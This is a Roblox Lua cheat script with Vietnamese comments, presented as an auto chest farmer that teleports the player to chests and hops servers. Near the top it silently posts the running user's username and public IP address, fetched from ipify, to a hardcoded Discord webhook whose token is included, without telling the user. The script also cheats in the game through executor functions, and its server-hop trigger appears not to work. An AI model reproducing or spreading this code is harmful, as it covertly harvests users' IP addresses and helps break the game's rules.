-- Thông Báo 
require(game.ReplicatedStorage:WaitForChild("Notification")).new(
            " <Color=Green>Turbo Lite X Auto Chest<Color=/> "
        ):Display()
        
--Webhook
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Auto Chest**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor, 
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1302586521131417610/8HgdPdFtBQKBDHD-0zkYRDFRsy8w-20baeuBdPOrcMTqJR9O95pEdurdXXV8-4Y-c1KH", AdminLoggerMsg()) -- Post to admin webhook

repeat
    wait()
until game:IsLoaded()

-- Xác định thế giới
local world = "Unknown World"
if game.PlaceId == 2753915549 then
    world = "World 1"
elseif game.PlaceId == 4442272183 then
    world = "World 2"
elseif game.PlaceId == 7449423635 then
    world = "World 3"
end

-- Thông báo script đã kích hoạt
game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Auto Chest",
        Text = "Đã kích hoạt script tại " .. world,
        Duration = 5
    }
)

-- Khởi tạo các dịch vụ cần thiết
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    return warn("Không tìm thấy LocalPlayer!")
end

local AutoFarmChest = true
local hopserver = false
local ChooseRegion = "Singapore"
local chestsRemaining = 0

-- Hàm tự động farm chest
local function AutoFarmChests()
    while task.wait() do
        if AutoFarmChest then
            local closestChest = nil
            local closestDistance = math.huge
            chestsRemaining = 0

            for _, v in pairs(Workspace:GetChildren()) do
                if v.Name:find("Chest") then
                    chestsRemaining = chestsRemaining + 1
                    local distance = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if distance < closestDistance then
                        closestChest = v
                        closestDistance = distance
                    end
                end
            end

            if closestChest then
                LocalPlayer.Character:PivotTo(closestChest:GetPivot())
                firesignal(closestChest.Touched, LocalPlayer.Character.HumanoidRootPart)
            elseif chestsRemaining == 0 then
                game.StarterGui:SetCore(
                    "SendNotification",
                    {
                        Title = "Auto Chest",
                        Text = "Đã Lụm Hết Gương! Đang Hop Server...",
                        Duration = 5
                    }
                )
                AutoFarmChest = false
                hopserver = true
            end
        end
    end
end

-- Đổi server
function HopServer(maxPlayers)
    maxPlayers = maxPlayers or 10
    game.StarterGui:SetCore(
        "SendNotification",
        {
            Title = "Server Hopping",
            Text = "Đang Hop Server... Chờ Một Lát!",
            Duration = 5
        }
    )
    local function GetServers()
        local page = 1
        while true do
            local servers = game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(page)
            for id, info in pairs(servers) do
                if id ~= game.JobId and info.Count < maxPlayers then
                    game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", id)
                    return true
                end
            end
            page = page + 1
        end
    end
    GetServers()
end

-- Kích hoạt script
spawn(AutoFarmChests)
spawn(function()
    if hopserver then
        HopServer(10)
    end
end)